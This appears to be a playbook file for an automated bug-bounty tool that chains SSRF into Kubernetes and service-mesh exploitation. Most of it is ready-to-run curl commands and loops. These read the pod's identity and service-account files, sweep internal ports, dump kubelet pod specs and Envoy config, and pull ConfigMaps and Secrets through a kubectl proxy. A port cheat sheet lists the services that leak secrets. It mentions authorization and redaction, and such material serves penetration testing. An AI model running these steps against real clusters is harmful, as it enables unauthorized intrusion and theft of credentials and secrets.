---
name: attack-ssrf-k8s-mesh
description: "SSRF → internal port scan → k8s/service-mesh exploitation — kubelet (10250, 10255), API server (6443), apiserver-kubelet 9901, ConfigMap/Secret dump, etcd 2379, service mesh admin ports"
category: "web-application"
version: "1.0"
author: "bountyreper-official"
tags:
  - ssrf
  - kubernetes
  - kubelet
  - configmap
  - port-scan
tech_stack:
  - k8s
  - web
cwe_ids:
  - CWE-918
chains_with:
  - attack-ssrf
  - attack-ssrf-classic
  - attack-ssrf-blind-harvest
prerequisites:
  - attack-ssrf
---

# SSRF → Internal Ports → K8s/Service-Mesh Dump

## Objective

Classic SSRF confirmed on a containerized target. Inside the pod network, two moves
turn it critical: (1) port-scan the pod-facing ranges to find kube/infra services, and
(2) hit the ones that leak CONFIG — ConfigMaps, Secrets, pod specs — without auth.

Container context changes the game: the fetcher is usually a pod with an attached
service account, so internal endpoints are THE jackpot. Authorization-gated: active
internal scanning needs lab/ROE clearance (document the scope in engagement_setup).

## Methodology

### 1. Establish the pod's own identity first

```bash
# The fetcher itself IS a pod — its own name/ip comes free from the metadata endpoints
curl "https://TARGET/fetch?url=http://127.0.0.1:15000/" }
# Pod metadata (kubernetes exec env)
curl "https://TARGET/fetch?url=file:///etc/hostname"
curl "https://TARGET/fetch?url=file:///proc/net/tcp"    # listening sockets self-view
curl "https://TARGET/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/namespace"
# Decide: is the SA token readable? pair with attack-ssrf-classic file://
```

### 2. Port sweep ports ALL k8s/infra-class services on the fetcher's subnet

```bash
for port in 6443 8443 10250 10255 10256 9901 9902 10248 2379 2380 9090 9093 3000 8080 8444 15000 15001 15020 53 9000 8001; do
  curl -s -o /dev/null -w "$port %{http_code}\n" \
    "https://TARGET/fetch?url=http://127.0.0.1:$port" &
done; wait
# Cluster-widening (if /proc/net/tcp or DNS gave the pod CIDR)
for ip in $(seq 1 15); do curl -s -o /dev/null -w "pod$ip: %{http_code}\n" \
  "https://TARGET/fetch?url=http://10.0.1.$ip:10250/healthz"; done
```

Port cheat sheet (the ones that LEAK config):

| Port | Service | Blind-read value |
|---|---|---|
| `10250` | **kubelet** (API, TLS) | `/pods` = full pod spec w/ env vars + secrets |
| `10255` | kubelet read-only | `/pods`, `/stats/summary`, `/metrics` — unauth dump |
| `10256` | kube-proxy healthz | node state |
| `10248` | kubelet config | pod log paths |
| `10249` | kube-proxy metrics | — |
| `9901` / `9902` | **Envoy admin** (mesh) | `/config_dump` — full mesh config incl. secrets by ref |
| `15000` | Istio Envoy admin | same as 9901 |
| `6443` / `8443` | kube-apiserver | version + auth locale (`/api/v1?anon`) |
| `2379` | etcd | key/value DB — CLUSTER SECRETS (rare, ~plain) |
| `9090` | Prometheus | metrics → app internals |
| `3000` | Grafana | dashboards+datasources (SSRF panel routing) |
| `53` | CoreDNS | zone-ish queries via DNS out-channel |
| `8001` | kubectl proxy (if present) | FULL unauth API relay the moment it exists |

### 3. Kubelet unauth-read playbook (the config jackpots)

```bash
# 10255 read-only (open = instant win, common on older clusters)
curl "https://TARGET/fetch?url=http://10.0.1.5:10255/pods"
# 10250 sometimes skips auth on /healthz /pods /runningpods/ (dev clusters)
curl "https:/TARGET/fetch?url=https://127.0.0.1:10250/pods" -k
# What /pods leaks: container env (DB_CONN=...), image names, prep secrets mount paths,
# labels/annotations → reassemble the CLUSTER MAP
```

### 4. Envoy / Istio mesh config dump (9901/15000/15001)

```bash
curl "https://TARGET/fetch?url=http://127.0.0.1:9901/config_dump"
# DISTRO: full route/vhost/cluster table →
#  - internal service FQDNs + ports → feed add_intel
#  - SDS secrets by reference → name only w/o material = severity note
curl "https://TARGET/fetch?url=http://127.0.0.1:9901/clusters"
curl "https://TARGET/fetch?url=http://127.0.0.1:9901/stats/prometheus"
# 15001 = inbound transparent capture (TLS termination proxy) — request smuggling springboard
```

### 5. Direct ConfigMap/Secret read via API-server relay (if 8001/10250-adjacent)

```bash
# kubectl proxy (8001) endpoint = plain HTTP kube-api relay — the trivially-critical one
curl "https://TARGET/fetch?url=http://127.0.0.1:8001/api/v1/namespaces/default/configmaps"
curl "https://TARGET/fetch?url=http://127.0.0.1:8001/api/v1/namespaces/default/secrets"
# Via SA-token file (attack-ssrf-classic file://) + internal DNS path:
# kubernetes.default.svc endpoint → apiserver; SA token in var — file reads first, then relay
```

### 6. Report assembly (the critical-activity list)

- Any `/pods` unauth read = high; env secrets visible = critical
- `config_dump` with actual secret VALUES (not just names) = critical
- etcd reachable = critical (everything, everywhere)
- 8001 relay = critical (full API surface)
- Always REDACT held secrets; show `type + name + holder` proof instead

## Notes

- Default OOB out-channel works here too — collect metadata names through DNS labels
  and forward to attack-ssrf-blind-harvest
- Container runtimes disable `file://` inside restricted fs — PodSecurity blocks this;
  favor /proc/net/tcp based port/endpoint discovery (blind-harvest §3)
